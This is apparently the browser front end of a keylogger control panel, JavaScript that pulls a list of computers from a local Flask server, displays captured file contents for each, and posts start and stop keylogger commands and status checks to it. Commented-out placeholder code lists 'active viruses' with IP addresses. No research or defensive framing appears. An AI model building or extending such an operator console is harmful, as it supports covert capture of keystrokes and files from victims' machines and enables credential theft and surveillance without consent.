const BACKEND_URL = "http://127.0.0.1:5000";
let currentComputer = null;

// Fetch the computer list from Flask backend
fetch(`${BACKEND_URL}/computers`)
    .then(response => response.json())
    .then(data => {
        let list = document.getElementById("computer-list");
        data.forEach(comp => {
            let li = document.createElement("li");
            li.textContent = comp;
            li.onclick = () => loadContent(comp);
            list.appendChild(li);
        });
    })
    .catch(error => console.error('Error fetching computers:', error));

// Fetch content of a selected computer
function loadContent(name) {
    currentComputer = name;
    // Show loading state
    let contentArea = document.getElementById("content-area");
    contentArea.textContent = "Loading content...";
    document.getElementById("control-status").textContent = "";
    document.getElementById("control-panel").style.display = 'flex';

    fetch(`${BACKEND_URL}/computer/${name}`)
        .then(response => response.json())
        .then(data => {
            let text = "";

            for (let file in data.content) {
                text += `=== ${file} ===\n${data.content[file]}\n\n`;
            }

            contentArea.textContent = text;

            // Simulate fetching active viruses and IPs (add real endpoint if available)
            // For demo, using placeholder data based on readme suggestion
            // let virusList = document.getElementById("virus-list");
            // virusList.innerHTML = ''; // Clear previous
            // const placeholderViruses = [
            //     { virus: "Virus A", ip: "192.168.1.1" },
            //     { virus: "Virus B", ip: "192.168.1.2" }
            // ];
            // placeholderViruses.forEach(v => {
            //     let li = document.createElement("li");
            //     li.textContent = `${v.virus} - IP: ${v.ip}`;
            //     virusList.appendChild(li);
            // });
            // document.getElementById("additional-info").style.display = 'block';

            // Fetch current keylogger status
            fetchKeyloggerStatus(name);
        })
        .catch(error => {
            contentArea.textContent = "Error loading content.";
            console.error('Error:', error);
        });
}

// Function to send command to start/stop keylogger
function sendCommand(command) {
    if (!currentComputer) return;

    fetch(`${BACKEND_URL}/api/command/${currentComputer}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ command: command })
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById("control-status").textContent = data.message || `Command '${command}' sent successfully.`;
    })
    .catch(error => {
        document.getElementById("control-status").textContent = "Error sending command.";
        console.error('Error:', error);
    });
}

// Fetch current keylogger status (optional, if implemented in backend)
function fetchKeyloggerStatus(name) {
    fetch(`${BACKEND_URL}/api/status/${name}`)
        .then(response => response.json())
        .then(data => {
            document.getElementById("control-status").textContent = `Current status: ${data.status || 'Unknown'}`;
        })
        .catch(error => {
            console.error('Error fetching status:', error);
        });
}

// Event listeners for buttons
document.getElementById("start-keylogger").addEventListener("click", () => sendCommand("start"));
document.getElementById("stop-keylogger").addEventListener("click", () => sendCommand("stop"));